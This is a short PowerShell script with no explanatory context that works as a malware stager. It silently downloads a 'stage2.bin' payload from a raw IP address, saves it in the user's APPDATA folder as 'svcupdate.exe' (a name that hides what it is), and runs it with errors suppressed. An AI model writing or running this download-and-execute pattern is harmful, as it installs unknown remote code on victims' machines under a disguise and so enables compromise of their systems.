
$TransferUrl = "http://192.0.2.236:8080/cdn/stage2.bin"
$OutputPath = "$env:APPDATA\svcupdate.exe"
curl.exe -s -L -o $OutputPath $TransferUrl
Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue
Write-Output "stage 22 initialized"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
